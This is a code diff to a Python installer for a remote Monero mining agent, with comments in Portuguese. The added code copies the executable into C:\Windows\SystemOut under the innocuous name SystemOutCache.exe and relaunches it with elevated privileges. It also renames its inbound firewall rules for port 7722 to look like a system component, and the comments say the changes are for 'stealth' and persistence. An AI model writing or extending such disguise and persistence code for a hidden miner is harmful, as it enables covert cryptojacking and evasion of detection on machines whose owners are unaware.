@@ -11,6 +11,7 @@ import psutil
 from datetime import datetime
 import platform
 import time
+import shutil
 import win32serviceutil
 import win32service
 import win32event
@@ -455,13 +456,46 @@ def install_self():
 
     print("=== INSTALAÇÃO AUTOMÁTICA MONERO REMOTO ===")
     log_install("Rodando com privilégios de Administrador.")
-    
+
+    # 1.5 Auto-Relocação (Stealth & Persistence)
+    # Se estiver rodando como EXE e fora do diretório alvo, se move para lá
+    if getattr(sys, 'frozen', False):
+        try:
+            target_dir = r"C:\Windows\SystemOut"
+            target_exe = os.path.join(target_dir, "SystemOutCache.exe")
+            current_exe = sys.executable
+
+            # Normaliza caminhos para comparação
+            if os.path.normpath(current_exe).lower() != os.path.normpath(target_exe).lower():
+                log_install(f"Detectado execução fora do diretório padrão. Movendo para {target_dir}...")
+                print(f"[+] Movendo para diretório seguro: {target_dir}")
+                
+                os.makedirs(target_dir, exist_ok=True)
+                shutil.copy2(current_exe, target_exe)
+                
+                log_install("Cópia realizada. Reiniciando processo a partir do novo local...")
+                print("[+] Reiniciando instalação a partir do novo local...")
+                
+                # Dispara o novo executável
+                params = "--elevated"
+                ctypes.windll.shell32.ShellExecuteW(
+                    None, "runas", target_exe, params, None, 1
+                )
+                
+                sys.exit(0)
+            else:
+                log_install("Já rodando do diretório correto. Prosseguindo...")
+        except Exception as e:
+            log_install(f"Erro na auto-relocação: {e}")
+            print(f"[!] Erro ao mover para SystemOut (continuando aqui mesmo): {e}")
+
     # 2. Configuração de Firewall (Via PowerShell - Mais confiável no Win11)
+    # Nomes alterados para 'SystemOutCache Agent' para maior stealth
     print("[+] Configurando Firewall (Porta 7722)...")
     log_install("Configurando Firewall via PowerShell...")
     try:
-        ps_cmd_tcp = "if (-not (Get-NetFirewallRule -DisplayName 'MoneroRemoto Agent TCP' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName 'MoneroRemoto Agent TCP' -Direction Inbound -LocalPort 7722 -Protocol TCP -Action Allow }"
-        ps_cmd_udp = "if (-not (Get-NetFirewallRule -DisplayName 'MoneroRemoto Agent UDP' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName 'MoneroRemoto Agent UDP' -Direction Inbound -LocalPort 7722 -Protocol UDP -Action Allow }"
+        ps_cmd_tcp = "if (-not (Get-NetFirewallRule -DisplayName 'SystemOutCache Agent TCP' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName 'SystemOutCache Agent TCP' -Direction Inbound -LocalPort 7722 -Protocol TCP -Action Allow }"
+        ps_cmd_udp = "if (-not (Get-NetFirewallRule -DisplayName 'SystemOutCache Agent UDP' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName 'SystemOutCache Agent UDP' -Direction Inbound -LocalPort 7722 -Protocol UDP -Action Allow }"
         
         # Executa TCP
         r1 = subprocess.run(["powershell", "-Command", ps_cmd_tcp], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
